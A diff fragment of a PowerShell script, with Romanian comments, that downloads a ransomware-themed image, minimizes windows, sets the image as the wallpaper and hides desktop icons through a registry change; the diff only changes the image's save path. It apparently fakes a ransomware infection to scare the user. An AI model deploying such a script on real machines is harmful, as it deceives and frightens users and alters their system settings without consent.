@@ -25,7 +25,7 @@ Try{
 
 # Descarca imaginea
 $imageUrl = "https://www.smartpcuser.com/wp-content/uploads/2020/07/wholocked-ransomware-wallpaper.png" 
-$outputPath = "%USERPROFILE%\Downloads\image.jpg" 
+$outputPath = "C:\image.jpg" 
 Invoke-WebRequest -Uri $imageUrl -OutFile $outputPath 
 Write-Output "Image downloaded successfully to $outputPath"
 
@@ -34,7 +34,7 @@ $shell = New-Object -ComObject Shell.Application
 $shell.MinimizeAll()
 
 # Seteaza imaginea descarcata ca desktop background
-[Wallpaper]::SystemParametersInfo(20, 0, "%USERPROFILE%\Downloads\image.jpg" , 3)
+[Wallpaper]::SystemParametersInfo(20, 0, "C:\image.jpg" , 3)
 
 # Ascunde icons de pe desktop
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name HideIcons -Value 1
